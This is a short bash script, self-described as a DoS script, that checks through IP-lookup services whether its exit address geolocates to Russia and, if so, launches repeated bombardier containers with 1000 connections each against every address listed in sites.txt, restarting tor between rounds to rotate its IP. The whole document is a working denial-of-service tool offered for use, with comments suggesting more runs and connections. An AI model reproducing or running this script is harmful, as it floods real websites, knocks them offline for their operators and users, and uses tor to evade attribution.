#!/bin/bash
# DoS script itself. Will run 2 (you can add more) bombardier containers for each URL/IP specified in sites.txt.
# Create sites.txt, put URL/IP addresses on each line.

echo "Starting bombardier containers..."

for i in {1..60}; do
   CURR_IP=$(wget -qO - https://api.ipify.org; echo)
   CHECK_IP=$(curl --silent https://freegeoip.app/csv/$CURR_IP; echo)
   echo $CHECK_IP
   if [[ $CHECK_IP =~ "Russia" ]]; then
      while IFS= read -r line; do
         docker run -d -it --rm alpine/bombardier -c 1000 -d 180s -l $line # you can change the amount of runs and connections
         docker run -d -it --rm alpine/bombardier -c 1000 -d 180s -l $line 
      done < sites.txt # Don't forget to create file with addresses
      sleep 180
   else
      echo "Location is not Russia, skipping iteration and updating IP..."
      sleep 20
   fi
   systemctl restart tor 2> /dev/null
   sleep 5
done
